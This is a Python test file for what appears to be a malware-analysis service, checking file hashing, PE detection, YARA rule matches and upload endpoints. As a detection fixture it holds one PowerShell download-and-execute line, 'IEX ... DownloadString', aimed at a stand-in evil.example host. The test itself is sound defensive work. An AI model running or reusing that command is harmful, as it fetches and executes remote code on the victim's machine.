"""Binary / YARA analysis engine + API tests (Phase 4)."""

import hashlib
from datetime import datetime, timezone
from pathlib import Path

from backend.app.binalysis import analyze_file, compile_yara_rules, yara_available
from backend.app.models.job import Job

AUTH_HEADER = {"Authorization": "Bearer test-token-v2"}

PE_BYTES = b"MZ" + b"\x00" * 58 + b"PE\x00\x00" + b"\x00" * 64
PS_TEXT = b"IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a')"


def _rules_dir() -> Path:
    import backend.app.binalysis as pkg
    return Path(pkg.__file__).parent / "rules"


def _now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


class TestEngine:
    def test_hashes_and_size(self, tmp_path):
        p = tmp_path / "sample.bin"
        p.write_bytes(PE_BYTES)
        a = analyze_file(p)
        assert a.sha256 == hashlib.sha256(PE_BYTES).hexdigest()
        assert a.md5 == hashlib.md5(PE_BYTES).hexdigest()
        assert a.size_bytes == len(PE_BYTES)
        assert 0.0 <= a.entropy <= 8.0

    def test_format_detection(self, tmp_path):
        p = tmp_path / "x.exe"
        p.write_bytes(PE_BYTES)
        a = analyze_file(p)
        assert a.artifact_class == "binary"
        assert a.format == "pe"

    def test_yara_pe_match(self, tmp_path):
        if not yara_available():
            return
        p = tmp_path / "x.exe"
        p.write_bytes(PE_BYTES)
        compiled = compile_yara_rules(_rules_dir())
        a = analyze_file(p, compiled)
        rules = {m.rule for m in a.yara_matches}
        assert "AIPAM_PE_Executable" in rules

    def test_yara_powershell_match(self, tmp_path):
        if not yara_available():
            return
        p = tmp_path / "evil.ps1"
        p.write_bytes(PS_TEXT)
        compiled = compile_yara_rules(_rules_dir())
        a = analyze_file(p, compiled)
        rules = {m.rule for m in a.yara_matches}
        assert "AIPAM_Suspicious_PowerShell" in rules


def _make_job(db) -> str:
    job = Job(
        job_id="33333333-3333-3333-3333-333333333333",
        job_name="Binary Job", status="completed",
        execution_profile="standard", priority="normal", created_at=_now_iso(),
    )
    db.add(job)
    db.commit()
    return job.job_id


class TestBinaryApi:
    def test_upload_analyze_list(self, app_client):
        client, db = app_client
        job_id = _make_job(db)

        r = client.post(
            f"/api/v1/jobs/{job_id}/binary?filename=evil.ps1",
            headers=AUTH_HEADER, content=PS_TEXT,
        )
        assert r.status_code == 201
        body = r.json()
        assert body["analysis"]["sha256"] == hashlib.sha256(PS_TEXT).hexdigest()
        assert body["analysis"]["size_bytes"] == len(PS_TEXT)
        if yara_available():
            assert body["rules_compiled"] is True
            assert body["findings_created"] >= 1

        # Idempotent re-upload: no duplicate findings
        r2 = client.post(
            f"/api/v1/jobs/{job_id}/binary?filename=evil.ps1",
            headers=AUTH_HEADER, content=PS_TEXT,
        )
        assert r2.status_code == 201
        assert r2.json()["findings_created"] == 0

        lr = client.get(f"/api/v1/jobs/{job_id}/binary", headers=AUTH_HEADER)
        assert lr.status_code == 200
        assert lr.json()["total"] == 1

    def test_inspect_stateless(self, app_client):
        client, db = app_client
        r = client.post(
            "/api/v1/binary/inspect?filename=x.exe",
            headers=AUTH_HEADER, content=PE_BYTES,
        )
        assert r.status_code == 200
        body = r.json()
        assert body["analysis"]["artifact_class"] == "binary"
        assert body["analysis"]["format"] == "pe"

    def test_empty_body(self, app_client):
        client, db = app_client
        job_id = _make_job(db)
        r = client.post(
            f"/api/v1/jobs/{job_id}/binary?filename=empty.bin",
            headers=AUTH_HEADER, content=b"",
        )
        assert r.status_code == 400

    def test_upload_requires_auth(self, app_client):
        client, db = app_client
        job_id = _make_job(db)
        r = client.post(f"/api/v1/jobs/{job_id}/binary", content=PE_BYTES)
        assert r.status_code == 401

    def test_job_not_found(self, app_client):
        client, _ = app_client
        r = client.get("/api/v1/jobs/missing/binary", headers=AUTH_HEADER)
        assert r.status_code == 404
